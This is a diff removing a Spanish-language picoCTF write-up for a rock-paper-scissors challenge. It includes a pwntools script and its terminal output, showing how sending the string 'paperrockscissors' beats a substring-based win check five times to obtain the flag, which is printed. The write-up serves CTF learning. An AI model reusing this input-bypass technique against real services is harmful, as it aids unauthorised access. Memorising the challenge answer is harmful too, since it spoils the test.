@@ -1,32 +1,3 @@
-## Description
-
-Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/145/game-redacted.c).Connect to the program with netcat:`$ nc saturn.picoctf.net 50860`
-#### Hints
-- How does the program check if you won?
-## Solución
-
-```shell
-┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/rps]
-└─$ python3 exploit.py
-[+] Opening connection to saturn.picoctf.net on port 62553: Done
-b"Welcome challenger to the game of Rock, Paper, Scissors\r\nFor anyone that beats me 5 times in a row, I will offer up a flag I found\r\nAre you ready?\r\nType '1' to play a game\r\nType '2' to exit the program"
-b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
-b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: rock\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
-b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
-b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: rock\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
-b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
-b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: paper\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
-b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
-b":\r\npaperrockscissors\r\nYou played: paperrockscissors\r\nThe computer played: paper\r\nYou win! Play again?\r\nType '1' to play a game\r\nType '2' to exit the program"
-b'\r\n1\r\n\r\n\r\nPlease make your selection (rock/paper/scissors)'
-
-picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
-[*] Closed connection to saturn.picoctf.net port 62553
-```
-
-```c
-┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/rps]
-└─$ cat game-redacted.c 
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
@@ -181,31 +152,3 @@ int main () {
   return 0;
 }
 
-```
-
-```python
-from pwn import *
-
-p = remote ('saturn.picoctf.net', 62553)
-
-for i in range(5):
-        print(p.recvuntil(b'exit the program'))
-        p.sendline(b'1')
-        print(p.recvuntil(b'(rock/paper/scissors)'))
-        p.sendline(b'paperrockscissors')
-
-p.recvuntil(b"Congrats, here's the flag!")
-print(p.recvuntil(b'}').decode())
-p.sendline (b'2')
-p.close
-
-```
-
-## Bandera
-```css
-flag: picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
-```
-## Notas Adicionales
-
-## Referencias
-- 
